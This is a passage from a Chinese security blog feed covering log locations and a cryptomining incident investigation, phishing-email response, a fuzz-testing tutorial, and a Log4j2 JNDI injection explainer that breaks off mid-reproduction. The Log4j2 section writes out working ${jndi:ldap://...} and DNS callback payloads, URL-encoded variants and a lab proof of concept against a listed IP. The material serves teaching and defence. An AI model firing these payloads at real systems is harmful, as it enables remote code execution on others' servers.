class="line">/var/log/daemon.log：包含各种系统后台守护进程日志信息。</span><br><span class="line">/var/log/kern.log：包含内核产生的日志，有助于在定制内核时解决问题。</span><br></pre></td></tr></table></figure><h3 id="Apache、Nginx与IIS日志位置及内容分析"><a href="#Apache、Nginx与IIS日志位置及内容分析" class="headerlink" title="Apache、Nginx与IIS日志位置及内容分析"></a>Apache、Nginx与IIS日志位置及内容分析</h3><blockquote><p>Apache日志</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apache——linux</span><br><span class="line">/var/log/apache2目录下，错误日志为error.log，访问日志一般带有access.log</span><br><span class="line">apache——windows</span><br><span class="line">window下日志的目录在apache安装目录的logs下</span><br></pre></td></tr></table></figure><p>apache日志示例：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">192.168.1.20 - - [22/Apr/2020:15:27:49 +0800] &quot;GET /1/index.php HTTP/1.1&quot; 404 490 &quot;-&quot; &quot;Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:45.0) Gecko/20100101 Firefox/45.0&quot;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">远端主机名+客户端日志名称（可空）+客户端用户名（可空）+服务器时间+请求内容（方法名、地址和http协议）+响应的http状态码的最终结果+服务器发送的字节数+来源页+客户端信息UA</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">apache的日志格式也可以去自定义，所在的配置文件在/etc/apache2/apache2.conf文件里</span></span><br></pre></td></tr></table></figure><blockquote><p>Nginx日志：</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">LINUX：</span><br><span class="line">/var/logs/nginx</span><br><span class="line">WINODWS：</span><br><span class="line">windows下Nginx日志默认在Nginx安装目录下的logs下。</span><br></pre></td></tr></table></figure><p>日志示例</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">192.168.1.220 - - [10/Jul/2020:15:51:09 +0800] &quot;GET /ubuntu.iso HTTP/1.0&quot; 0.000 129 404 168 &quot;-&quot; &quot;Wget/1.11.4 Red Hat modified&quot;</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">客户端ip地址 + - +客户端用户名称（可空）+通用日志格式下的本地时间 + 请求的URL和HTTP协议 + 请求处理时间 + 请求的长度 + 请求状态 + 发送给客户端的字节数（不包括响应头大小）+ 源页面 + 客户端信息</span></span><br></pre></td></tr></table></figure><blockquote><p>IS日志位置：</p></blockquote><p> IIS的日志位置与IIS的版本号的不同也有不同，相关配置文件的位置也有不同。</p><table><thead><tr><th>版本</th><th>日志位置</th><th>配置文件位置</th></tr></thead><tbody><tr><td>IIS6</td><td>C:\Windows\System32\LogFiles</td><td>C:\WINDOWS\system32\inetsrv\MetaBase.xml</td></tr><tr><td>IIS7</td><td>C:\inetpub\logs\LogFiles</td><td>C:\Windows\System32\inetsrv\config\applicationHost.config</td></tr></tbody></table><h3 id="mysql日志"><a href="#mysql日志" class="headerlink" title="mysql日志"></a>mysql日志</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/var/lib/mysql/    </span><br></pre></td></tr></table></figure><h2 id="一次服务器溯源经历"><a href="#一次服务器溯源经历" class="headerlink" title="一次服务器溯源经历"></a>一次服务器溯源经历</h2><blockquote><p>[挖矿病毒排查](<a href="https://help.aliyun.com/document_detail/161236.html#:~:text=%E9%9D%9E%E4%BA%91%E5%AE%89%E5%85%A8%E4%B8%AD%E5%BF%83%E7%94%A8%E6%88%B7%E5%A4%84%E7%90%86%E6%8C%96%E7%9F%BF%E7%A8%8B%E5%BA%8F%EF%BC%88Windows%E7%B3%BB%E7%BB%9F%EF%BC%89">https://help.aliyun.com/document_detail/161236.html#:~:text=非云安全中心用户处理挖矿程序（Windows系统）</a> 1 执行以下命令，通过CPU占用情况排查可疑的挖矿进程。… 2 执行以下命令，查看挖矿进程的磁盘文件、进程启动命令的参数。… 3 结束挖矿进程，清除挖矿文件。,4 执行以下命令，检查主机连接的可疑网络端口。… 5 执行以下命令，检查服务器中hosts文件是否存在挖矿程序的矿 … 6 执行以下命令，排查是否存在挖矿程序设定的计划任务。)</p></blockquote><p><strong>自己曾经在VPS上开了一个搭建了Xiuno BBS社区，刚运行没过几天就被入侵了，</strong></p><p>ssh登录到服务器上的时候，发现操作有点卡，感觉到服务器的异常，有点卡顿，一开始没有太在意</p><p>慢慢越来越卡 直接动不了 然后重启后就去查找问题</p><p>然后突然想到那段时间在一个老师那学习redis写定时任务的时候，看到docker里面养了几个挖矿脚本。就是在crontab目录下，发现了几个奇怪的.sh脚本。怀疑上了是不是我也中了</p><p>我查杀溯源流程：</p><p>直接输入Top命令查看进程占用状况，再按大写的P，根据CPU利用率来看看进程：看到有一个进程的 CPU 占用率很高</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">P – 以 CPU 占用率大小的顺序排列进程列表 </span><br><span class="line">M – 以内存占用率大小的顺序排列进程列表</span><br></pre></td></tr></table></figure><p>记住他的pid</p><p>分析这个异常进程</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">netstat -antlp|grep PID      #查看此端口的占用情况； </span><br><span class="line">ps -ef|grep PID      #查看该pid的进程的详细信息；</span><br></pre></td></tr></table></figure><p>终端输入 netstat -anpt，看到有一个IP 为 158.69.133.20:3333 ，明显不是我自己的异常 IP。</p><p>我顺手把 IP地址复制，利用 <a href="http://www.ipip.net/ip.html">http://www.ipip.net/ip.html</a> ，找到IP所在的地理位置，</p><p>我再到微步威胁情报平台查询 IP 信息 (<a href="http://x.threatbook.cn/ip/158.69.133.20">http://x.threatbook.cn/ip/158.69.133.20)</a></p><p>被标记为恶意IP，有挖矿标记</p><p>然后懂了 我的vps被入侵拉去挖矿了，十有八九就是因为刚搭的社区</p><p>现在要做的是找到入侵源头并清除他</p><p>首先要找到文件位置，<strong>kill</strong>进程。根据进程 pid 1758直接ls -lh &#x2F;proc&#x2F;PID查看该进程的具体信息：</p><p>可以看到进程的exe指向的文件在&#x2F;var&#x2F;tmp目录下，然后我们先kill -9 1758杀死进程，避免进程占用CPU资源导致我们相关操作有点慢。</p><p>后来从网上查看了一下常规的那种挖矿</p><p>这种挖矿程序，一般都是通过bash脚本进行执行（这个时候就联想到了crontab下的几个文件），然后下载进行启动</p><p>想通过 history 看看是否有 wget、curl等下载行为，后来发现好像是清空了</p><p>有去查看了系统日志：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /var/log/syslog | grep .sh</span><br></pre></td></tr></table></figure><p>发现wget下载了一个.sh脚本</p><p>由于下载地址还没有失效，可以直接下载脚本分析行为：</p><blockquote><ul><li><p>除了 &#x2F;var&#x2F;tmp 目录下的文件，其他文件已自删除</p></li><li><p>脚本中还修改了 crontab任务</p></li></ul></blockquote><p>查看这个脚本文件 发现很长很乱，疑似用base64编码了</p><p>然后把所有和的crontab有关的目录都给查看了一遍，都删了</p><p>一开始没删全一直反复出现1，原来在定时任务中会反复的自我复制</p><p>清理方式：直接删除 &#x2F;var&#x2F;tmp 目录下的恶意文件。</p><p>然后检查ssh，发现还写入了公钥</p><p>然后就想到既然写了公钥，肯定会再次登录的（因为之前的wtmp文件被清理过来了，看不到痕迹）</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/var/log/btmp记录错误登录日志，这个文件是二进制文件，不能直接vi查看，而要使用lastb命令查看</span><br></pre></td></tr></table></figure><p>只能等他再次登录</p><p>去网上看看有没有什么办法提醒我</p><p>后来找到一个脚本实现SSH登录邮件报警</p><p>并且开启了更全面history、last命令记录，会记录什么用户，在什么ip，什么时间执行了什么命令</p><p>后来就一直等 守株待兔 </p><p>后来不久第二天就收到了 然后赶紧上机 查看history及last登录日志 </p><p>总结一下： </p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">总结一下：</span><br><span class="line">last：/var/log/wtmp*</span><br><span class="line">tail ~/.*h_history</span><br><span class="line">sudo tail /var/log/auth.log</span><br><span class="line">sudo tail /var/log/syslog</span><br><span class="line">w</span><br><span class="line">who</span><br><span class="line">lastb: /var/log/btmp*</span><br><span class="line">lastlog: /var/log/lastlog*</span><br></pre></td></tr></table></figure><p>记录登录ip</p><p>发现应该是真实ip</p><p>此时就暂且标记下来，待日后复仇</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">在/var/log/secure可以看到登陆的情况</span><br><span class="line">在/var/log/wtmp中可以查看到登陆失败的记录（可通过lastb命令进行检查）</span><br><span class="line">在/var/log/lastlog中可以查看最近登陆的记录 （可通过last命令进行检查）</span><br><span class="line">通过who检查当前在线用户</span><br></pre></td></tr></table></figure><h1 id="如何发现钓鱼邮件"><a href="#如何发现钓鱼邮件" class="headerlink" title="如何发现钓鱼邮件"></a>如何发现钓鱼邮件</h1><h2 id="钓鱼邮件发现"><a href="#钓鱼邮件发现" class="headerlink" title="钓鱼邮件发现"></a>钓鱼邮件发现</h2><blockquote><p>发现途径如下：</p><p>邮件系统异常登录告警、员工上报、异常行为告警、邮件蜜饵告警</p><p>推荐接入微步或奇安信的情报数据。对邮件内容出现的 URL 做扫描，可以发现大量的异常链接</p></blockquote><h2 id="钓鱼邮件处置"><a href="#钓鱼邮件处置" class="headerlink" title="钓鱼邮件处置"></a>钓鱼邮件处置</h2><blockquote><p><a href="https://www.freebuf.com/articles/es/264037.html">https://www.freebuf.com/articles/es/264037.html</a></p></blockquote><ul><li><ol><li>屏蔽办公区域对钓鱼邮件内容涉及站点、URL 访问</li></ol></li></ul><blockquote><p>根据办公环境实际情况可以在上网行为管理、路由器、交换机上进行屏蔽</p><p>邮件内容涉及域名、IP 均都应该进行屏蔽</p><p>对访问钓鱼网站的内网 IP 进行记录，以便后续排查溯源可能的后果</p></blockquote><ul><li><ol start="2"><li>屏蔽钓鱼邮件</li></ol></li></ul><blockquote><p>屏蔽钓鱼邮件来源邮箱域名</p><p>屏蔽钓鱼邮件来源 IP</p><p>有条件的可以根据邮件内容进行屏蔽</p><p>删除还在邮件服务器未被客户端收取钓鱼邮件</p></blockquote><ul><li><ol start="3"><li>处理接收到钓鱼邮件的用户</li></ol></li><li><ol start="4"><li>根据钓鱼邮件发件人进行日志回溯</li></ol></li></ul><blockquote><p>此处除了需要排查有多少人接收到钓鱼邮件之外，还需要排查是否公司通讯录泄露。采用 TOP500 姓氏撞库发送钓鱼邮件的攻击方式相对后续防护较为简单。如果发现是使用公司通讯录顺序则需要根据通讯录的离职情况及新加入员工排查通讯录泄露时间。毕竟有针对性的社工库攻击威力要比 TOP100、TOP500 大很多</p></blockquote><ul><li><ol start="5"><li>通知已接收钓鱼邮件的用户进行处理</li></ol></li><li><ol start="6"><li>删除钓鱼邮件</li></ol></li><li><ol start="7"><li>系统改密</li></ol></li><li><ol start="8"><li>全盘扫毒</li></ol></li><li><ol start="9"><li>后续：溯源、员工培训提升安全意识</li></ol></li></ul><h1 id="蓝队高级操作"><a href="#蓝队高级操作" class="headerlink" title="蓝队高级操作"></a>蓝队高级操作</h1><h2 id="反击CobaltStrike-分析c2"><a href="#反击CobaltStrike-分析c2" class="headerlink" title="反击CobaltStrike 分析c2"></a>反击CobaltStrike 分析c2</h2><blockquote><ul><li><a href="http://www.hackdig.com/09/hack-465456.htm">反击CobaltStrike（一） 以假乱真</a></li><li><a href="https://wbglil.gitbook.io/cobalt-strike/cobalt-strike-yuan-li-jie-shao/cs-mu-biao-shang-xian-guo-cheng">CS Beacon通信分析</a></li><li><a href="https://zhuanlan.zhihu.com/p/158770940">c&amp;c攻击与检测分析</a></li></ul></blockquote><h2 id="信息外连c2"><a href="#信息外连c2" class="headerlink" title="信息外连c2"></a>信息外连c2</h2><h1 id="refer"><a href="#refer" class="headerlink" title="refer"></a>refer</h1><blockquote><ul><li><a href="https://rainy-autumn.top/archives/453">护网面试知识点复习</a></li><li><a href="https://cxymm.net/article/zlloveyouforever/125174473">2022年蓝队初级护网总结_热爱画家夫人的博客-程序员秘密</a></li><li><a href="https://cloud.tencent.com/developer/article/1815280">蓝队的自我修养之事中监控 | HVV经验分享</a></li><li><a href="https://www.freebuf.com/articles/terminal/253322.html">CobltStrike的检测与发现</a></li><li><a href="https://zhuanlan.zhihu.com/p/478353548">蓝队面试题整理</a></li><li><a href="https://cloud.tencent.com/developer/article/1815280">蓝队的自我修养之事中监控 | HVV经验分享</a></li></ul></blockquote>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> 面试+笔试 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Fuzz测试</title>
      <link href="/2022-09-22-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%8A%80%E6%9C%AF/Fuzz%E6%B5%8B%E8%AF%95/"/>
      <url>/2022-09-22-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%8A%80%E6%9C%AF/Fuzz%E6%B5%8B%E8%AF%95/</url>
      
        <content type="html"><![CDATA[<p>转载学习-侵删</p><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>描述:在学习它时候我们有必要学习 Fuzz音标 英&#x2F;fʌz&#x2F;;</p><ul><li>什么是Fuzz技术?</li></ul><p>答:Fuzz是一种基于黑盒的自动化软件模糊测试技术,简单的说一种懒惰且暴力的技术融合了常见的以及精心构建的数据文本进行网站、软件安全性测试;<br>实现形式与目的:它可向目标发送随机或精心构造的数据作为计算机输入，来触发非常规反馈以达到检测漏洞的目的。</p><ul><li>优势:</li></ul><blockquote><ul><li>节约测试成本和时间;一般的Fuzz工具自带完备的异常检测机制，发送数据后能精准查出哪些Payload导致了非常规反馈，在输出中将这些触发异常的Payload列出，大大降低了人工测试成本，渗透测试人员只需关注感兴趣的部分。</li><li>检测范围、规模大;自动化工具在测试用例的效率和完善上是人工无法比较的，且很多潜在的有效Payload套路固定，这些Payload就无需手工测试，只需有一份精心构造的文件和规则即可完成Fuzz。</li><li>覆盖可能性多，可检测出意想不到的异常;</li></ul></blockquote><ul><li>Fuzz的核心思想:</li></ul><blockquote><ul><li>目录Fuzz(漏洞点)</li><li>参数Fuzz(可利用参数)</li><li>PayloadFuzz(bypass)</li></ul></blockquote><h1 id="Fuzz应用场景"><a href="#Fuzz应用场景" class="headerlink" title="Fuzz应用场景"></a>Fuzz应用场景</h1><ol><li>漏洞挖掘与Fuzz之敏感目录类似的工具,可能您再入门的时候使用过御剑而其内置的字典就是Fuzz的一种;</li></ol><blockquote><p>那么这种扫描有什么好处呢？</p><p>答:就是针对一部分网站可以扫描的全面，只要你的字典足够强大就可以扫描到绝大多部分的目录和文件，来自Blasting_dictionary(附录1)的爆破字典很好</p></blockquote><ol start="2"><li>漏洞挖掘与Fuzz之敏感文件可利用参数</li></ol><blockquote><ul><li>fuzz参数来达到Jsonp劫持以及XSS漏洞等等;</li><li>越权验证信息</li></ul></blockquote><ol start="3"><li>漏洞挖掘与Fuzz之Bypass</li></ol><blockquote><ul><li>SQL injection Bypass</li><li>Open redirect</li><li>XSS Fuzzer</li></ul></blockquote><h1 id="Fuzz常用工具"><a href="#Fuzz常用工具" class="headerlink" title="Fuzz常用工具"></a>Fuzz常用工具</h1><ul><li><p>御剑: 界面化目录和文件扫描</p></li><li><p>Dirsearch : 扫描模式和dirbuster是差不多</p></li><li><p>Dirb :他的字典和御剑的不一样的就是没有针对目录和准确的定位到每个文件而是一个一个的目录名，那么这种扫描下是有一些有点的就是先发现目录在进行文件爆破，而且dirb的判断很智能他在你输入目标后会进行计算错误的请求，避免内些返回200的not found</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Usage : dirb https://domain.com/</span><br></pre></td></tr></table></figure></li><li><p>Nikto : 作用在于目录的爆破</p></li><li><p>wfuzz : 一款十分万能的工具我最近的目录爆破全都是使用wfuzz用熟练之后真的非常十分方便，排除一些响应码之后直接baseline这是我目前比较喜欢的用法</p><p>案例就是wfuzz</p><p>在fuzz过后发现了item参数，这是访问 <a href="http://rob-sec-1.com/test/?item=XSSpayload%E6%88%90%E5%8A%9F%E5%BC%B9%E7%AA%97">http://rob-sec-1.com/test/?item=XSSpayload成功弹窗</a></p></li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ wfuzz -w /usr/share/wordlists/dirb/common.txt --hh 53 &#x27;http://rob-sec-1.com/test/?FUZZ=XSSpayload&#x27;</span><br><span class="line"></span><br><span class="line">Target: HTTP://rob-sec-1.com/test/?FUZZ=XSSpayload</span><br><span class="line">Total requests: 4614</span><br><span class="line">ID    Response   Lines      Word         Chars          Payload    </span><br><span class="line">02127:  C=200      9 L           8 W         84 Ch      &quot;item&quot;</span><br><span class="line"></span><br><span class="line">Total time: 14.93025</span><br><span class="line">Processed Requests: 4614</span><br><span class="line">Filtered Requests: 4613</span><br><span class="line">Requests/sec.: 309.0369</span><br></pre></td></tr></table></figure><img src="https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2019/1/20190920095433.png" alt="WeiyiGeek." style="zoom:50%;" /><h2 id="辅助Fuzz的工具"><a href="#辅助Fuzz的工具" class="headerlink" title="辅助Fuzz的工具"></a>辅助Fuzz的工具</h2><p>Burpsuite的扩展程序CO2: Sqlmapper模块很好对于我这种注入菜的很的来说简直就是福音，而CeWler的功能是参数提取，比如我们在Http history 里找返回包右键发送到CeWler模块就可以进行参数提取了，在实战中的用处很大，可以把参数提取出来保存做参数字典更高效。</p><h1 id="附录"><a href="#附录" class="headerlink" title="附录"></a>附录</h1><blockquote><p><a href="https://github.com/rootphantomer/Blasting_dictionary">https://github.com/rootphantomer/Blasting_dictionary</a></p></blockquote><h1 id="refer"><a href="#refer" class="headerlink" title="refer"></a>refer</h1><blockquote><ul><li>原文地址：<a href="https://blog.weiyigeek.top/2019/8-28-379.html">https://blog.weiyigeek.top/2019/8-28-379.html</a></li><li><a href="https://blog.weiyigeek.top/2019/9-20-425.html">网站扫描与Fuzz测试之敏感信息收集:</a></li></ul></blockquote>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> 技术 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>0x15 - Apache Log4j2漏洞</title>
      <link href="/2022-09-22-WEB%E5%AE%89%E5%85%A8/%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E/0x15-Apache%20Log4j2%E6%BC%8F%E6%B4%9E/"/>
      <url>/2022-09-22-WEB%E5%AE%89%E5%85%A8/%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E/0x15-Apache%20Log4j2%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<p>Apache Log4j2漏洞</p><h1 id="Apache-log4j简介"><a href="#Apache-log4j简介" class="headerlink" title="Apache log4j简介"></a>Apache log4j简介</h1><p>Apache log4j是Apache的一个开源项目，Apache log4j 2是一个就Java的日志记录工具，用来打印程序的日志，方便开发人员便于排查问题等。该工具重写了log4j框架，并且引入了大量丰富的特性。我们可以控制日志信息输送的目的地为控制台、文件、GUI组建等，通过定义每一条日志信息的级别，能够更加细致地控制日志的生成过程。</p><h1 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h1><p>log4j2中存在JNDI注入漏洞，当程序记录用户输入的数据时，即可触发该漏洞。成功利用该漏洞可在目标服务器上执行任意代码。</p><h1 id="漏洞范围"><a href="#漏洞范围" class="headerlink" title="漏洞范围"></a>漏洞范围</h1><blockquote><p>几乎无处不在</p></blockquote><blockquote><p>影响组件应用</p><blockquote><ul><li>Apache Spring-Boot-strater-log4j2<strong>（漏洞复现一）</strong></li><li>Apache Struts2</li><li>Apache Solr</li><li>Apache Flink</li><li>Apache Druid &#x2F; DruidElasticSearch</li></ul></blockquote><p>其他</p><blockquote><ul><li>Flume</li><li>Dubbo</li><li>Redis</li><li>Logstash</li><li>Kafka</li><li>vmvare</li></ul></blockquote><p>影响log4j版本</p><blockquote><p>Apache Log4j 2.0 ~ 2.15.0-rc1</p></blockquote></blockquote><h1 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h1><h2 id="log4j2日志工具简单介绍"><a href="#log4j2日志工具简单介绍" class="headerlink" title="log4j2日志工具简单介绍"></a>log4j2日志工具简单介绍</h2><p>log4j是一款通用日志记录工具，开发人员可以使用log4j对当前程序状态进行记录。log4j的功能非常强大，开发人员除了直接记录文本外，还可以使用简单表达式记录动态内容，例如：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">logger.info(&quot;system propety: $&#123;sys:user.dir&#125;&quot;);</span><br></pre></td></tr></table></figure><p>简单表达式使用 ${} 进行包裹，上述示例中，<code>sys:user.dir</code> 表示使用<strong>sys解析器</strong>，查找user.dir的内容，即在系统环境变量中查找user.dir，以替换 <code>$&#123;sys:user.dir&#125;</code> 进行打印。</p><blockquote><p>从上面这段话中，我们需要理解的是 <code>$&#123;&#125;</code> 之中包裹的内容，类似一直变量，可以通过不同的解析器解析不同的变量~</p></blockquote><p>虽然日志输出用户是看不到，所以显示了也没啥影响。但是实际上这里是存在着JNID注入的。</p><p>下面我们漏洞利用是使用的其他解析器~~JNDI</p><h2 id="JNDI注入简单介绍"><a href="#JNDI注入简单介绍" class="headerlink" title="JNDI注入简单介绍"></a>JNDI注入简单介绍</h2><p>JNDI，中文名叫java命名和目录接口，它为我们提供了命名和目录服务。<strong>主要是JNDI其中有一个lookup()方法，这是一个查找方法，log4j2在获取到${}这样的格式的时候会自动的去调用lookup()方法。</strong></p><p>这个方法的可怕之处就在于，<strong>如果lookup方法的参数是一个url地址时，那么客户端就会去lookup()方法参数指定的url中加载远程对象</strong>。比如我们传一个像：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">lookup(&quot;rmi://127.0.0.1/test&quot;)</span><br><span class="line">lookup(&quot;ldap://127.0.0.1/test&quot;)</span><br></pre></td></tr></table></figure><p>这样的参数进去，它就可以远程访问到我们（黑客）本地的类，那如果这些类里面有恶意代码的话造成的危害显然是非常严重的。</p><h2 id="lt-关键-gt"><a href="#lt-关键-gt" class="headerlink" title="&lt;关键&gt;"></a><strong>&lt;关键&gt;</strong></h2><p>log4j中除了sys解析器外，还有很多其他类型的解析器。其中，<strong>jndi 解析器</strong>就是本次漏洞的源头。</p><p><strong>jndi 解析器将通过 jdk 获取 jndi 对象</strong>，并使用这个 jndi 对象替换原有文本进行打印。 我们将 jndi 对象理解成为一个从程序外部获取的 Java 程序对象就可以了。<strong>jdk中提供了多种不同 jndi 对象的获取方式，获取方式可以称为schema</strong>，所以正常的包含jndi的日志记录方式如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">logger.info(&quot;system propety: $&#123;jndi:schema://url&#125;&quot;);</span><br></pre></td></tr></table></figure><p>上述schema和url需替换成真实的内容方可生效。</p><blockquote><ul><li>schema ：</li></ul><p>schema是查找jndi对象的方式，jdk中支持以下几种schema：</p><blockquote><ul><li>corbname</li><li>dns</li><li>iiop</li><li>iiopname</li><li>ldap</li><li>ldaps</li><li>rmi</li></ul></blockquote><ul><li>url</li></ul><p>url是几种不同的schema下jndi的路径。<strong>不同的schema，url路径的配置方法不同</strong>。</p><p>常用的schame是ldap，其url写法比较简单：jndi:ldap:&#x2F;&#x2F;xxx.dnslog.cn</p></blockquote><p>jdk将从url指定的路径下载一段字节流，并将其反序列化为Java对象，作为jndi返回。反序列化过程中，即会执行字节流中包含的程序。</p><p>因此，如果攻击者能够控制日志打印的内容，就可以使目标服务器从攻击者指定的任意url地址下载代码字节流，攻击者在字节流中附带的代码就会在目标服务器上执行。</p><h2 id="如何控制日志输出？"><a href="#如何控制日志输出？" class="headerlink" title="如何控制日志输出？"></a>如何控制日志输出？</h2><p><strong><u>那么问题来了，攻击者如何控制服务器上记录的日志内容呢？</u></strong></p><blockquote><p>非常简单！ 大部分web服务程序都会对用户输入进行日志记录。例如：用户访问了哪些url，有哪些关键的输入等，都会被作为参数送到log4j中。</p><p>我们在这些地方写上 <code>$&#123;jndi:ldap://xxx.dnslog.cn&#125;</code> 就可以使web服务从<code>xxx.dnslog.cn</code>下载字节流了。</p></blockquote><p>12月9日晚，漏洞刚爆出时，在百度、google的搜索框内输入攻击字符串，就可以进行攻击。不提供输入框也好办，在url中随便附上一段也可能成功： <code>www.target.com?$&#123;jndi:schema://url&#125;</code></p><h2 id="payload干了什么"><a href="#payload干了什么" class="headerlink" title="payload干了什么"></a>payload干了什么</h2><blockquote><p><strong>当log4j2打印的日志内容中包含${jndi:ldap:&#x2F;&#x2F;x.x.x.x}时，程序会通过ldap协议访问x.x.x.x这个地址，x.x.x.x会返回一个指向class文件的地址，程序会通过返回的地址下载class文件并执行。</strong></p></blockquote><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><blockquote><p>Apache Log4j是一个基于Java的日志记录组件。</p><p>log4j2可以使用简单表达式记录动态内容,也就是可以传入变量，也就是<code>$&#123;&#125;</code></p><p>简单表达式使用 ${} 进行包裹变量，在 ${} 后面可以使用一些解析器，解析动态内容，打印出来解析的结果（本来我们看不到日志内容，但是可以通过dnslog带出执行结果）</p><p><strong>在这个${}里面存在着JNDI注入</strong></p><p><code>$&#123;&#125;</code>解析变量有多种方式多种解析器，log4j2漏洞便是因为jndi解析器。</p><p>主要是JNDI其中有一个lookup()方法，这是一个查找方法，log4j2在获取到${}这样的格式的时候会自动的去调用lookup()方法。</p><p>这个方法的可怕之处就在于，<strong>如果lookup方法的参数是一个url地址时，那么客户端就会去lookup()方法参数指定的url中加载远程对象</strong>。比如<code>lookup(&quot;rmi://127.0.0.1/test&quot;)</code></p><p>回过头来，jndi 解析器可以获取远程 jndi 对象。jdk中提供了多种不同 jndi 对象的获取方式，获取方式可以称为schema，注入rmi，ldap，dns</p><p>我们使用jndi利用ldap或者rmi的方式加载远程恶意类并执行即可达到我们getshell的目的</p></blockquote><h1 id="Log4j2漏洞发现"><a href="#Log4j2漏洞发现" class="headerlink" title="Log4j2漏洞发现"></a>Log4j2漏洞发现</h1><h2 id="被动扫描发现"><a href="#被动扫描发现" class="headerlink" title="被动扫描发现"></a>被动扫描发现</h2><p>通过burp插件的方式，将Log4j2漏洞检测能力集成到burp进行被动扫描。在访问网站抓包的过程中，检测到目标站点存在Log4j2 RCE漏洞。</p><blockquote><p>下载地址: <a href="https://github.com/p1n93r/Log4j2Scan/releases/download/v1.0.0/Log4j2Scan.jar">https://github.com/p1n93r/Log4j2Scan/releases/download/v1.0.0/Log4j2Scan.jar</a> </p><p>添加到burp扩展模块上使用</p></blockquote><h2 id="确认漏洞参数"><a href="#确认漏洞参数" class="headerlink" title="确认漏洞参数"></a>确认漏洞参数</h2><p>可以插入的参数太多，直接Fuzz模糊测试，由于使用参数Fuzz，每个数据包里都夹带多个参数注入Payload，我们需要进一步定位到具体的漏洞参数位置。</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209221625755.png" alt="image-20220922162542664" style="zoom:50%;" /><p>构造pyload验证</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$&#123;jndi:dns://dzgyb7ks8bqbemcmmili77efw62xqm.burpcollaborator.net/t&#125; </span><br><span class="line">burp发包需要输入进行了URL编码后的结果 </span><br><span class="line">%24%7Bjndi%3Adns%3A%2F%2Fdzgyb7ks8bqbemcmmili77efw62xqm.burpcollaborator.net%2Ft%7D</span><br></pre></td></tr></table></figure><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209221644035.png" alt="image-20220922164456927" style="zoom:50%;" /><h1 id="漏洞复现一"><a href="#漏洞复现一" class="headerlink" title="漏洞复现一"></a>漏洞复现一</h1><blockquote><p>涉及：srping-boot</p></blockquote><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker pull vulfocus/log4j2-rce-2021-12-09</span><br><span class="line">docker run -dit -p 28080:8080 vulfocus/log4j2-rce-2021-12-09</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">访问http://124.223.217.243:28080/</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">http://124.223.217.243:28080/hello/</span></span><br></pre></td></tr></table></figure><h2 id="POC测试"><a href="#POC测试" class="headerlink" title="POC测试"></a>POC测试</h2><p>很多地方都可以尝试poc，测一测，这种可能存在log4j的网站，都可以直接拿poc试一试！！~~</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">dnslog获取一个子域名http://www.dnslog.cn/</span></span><br><span class="line">a8x0nz.dnslog.cn</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">填进payload</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">&#123;jndi:ldap://a8x0nz.dnslog.cn&#125;</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">对POC进行URL编码后发送：</span></span><br><span class="line"><span class="meta prompt_">%</span><span class="language-bash">24%7Bjndi%3Aldap%3A%2F%2Fa8x0nz.dnslog.cn%7D</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">payload</span></span><br><span class="line">payload=%24%7Bjndi%3Aldap%3A%2F%2Fa8x0nz.dnslog.cn%7D</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">测试页面是http://124.223.217.243:28080/hello/</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">完整url</span></span><br><span 